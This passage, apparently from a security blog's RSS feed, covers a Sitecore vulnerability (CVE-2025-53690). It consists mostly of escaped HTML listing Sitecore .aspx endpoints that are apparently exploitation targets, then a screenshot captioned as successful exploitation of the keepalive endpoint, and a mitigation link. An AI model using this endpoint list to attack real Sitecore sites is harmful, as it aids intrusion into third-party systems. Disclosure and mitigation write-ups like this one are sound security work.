&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Heartbeat&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;keepalive&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;noaccess&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nolayout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nolicense&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;noPublishable&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;notfound&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xdb&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;disabled&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ConfirmSubscription&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ListUnsubscribe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;RedirectUrlPage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Unsubscribe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;UnsubscribeFromAll&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Single&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt; &lt;span class="n"&gt;Layout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt; &lt;span class="n"&gt;Message&lt;/span&gt; &lt;span class="n"&gt;Layout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Two&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt; &lt;span class="n"&gt;Layout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Alternating&lt;/span&gt; &lt;span class="n"&gt;Columns&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Call&lt;/span&gt; &lt;span class="n"&gt;To&lt;/span&gt; &lt;span class="n"&gt;Action&lt;/span&gt; &lt;span class="n"&gt;Focus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Image&lt;/span&gt; &lt;span class="n"&gt;Focus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Main&lt;/span&gt; &lt;span class="n"&gt;Layout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Thee&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt; &lt;span class="n"&gt;Long&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EXM&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Two&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ExperienceExplorer&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Controls&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ExpEditor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ExperienceExplorer&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Controls&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ExpViewer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Successful exploitation on the keepalive endpoint:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image43.png"
width="3155"
height="1670"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image43_hu_b071014e46dd80f7.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image43_hu_9f7b166457a2e7b1.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="188"
data-flex-basis="453px"
&gt;&lt;/p&gt;
&lt;h2 id="mitigation"&gt;Mitigation
&lt;/h2&gt;&lt;p&gt;Please follow the mitigation steps on Sitecore bullettin here: &lt;a class="link" href="https://support.sitecore.com/kb?id=kb_article_view&amp;amp;sysparm_article=KB1003865" target="_blank" rel="noopener"
&gt;https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865&lt;/a&gt;&lt;/p&gt;</description></item></channel></rss>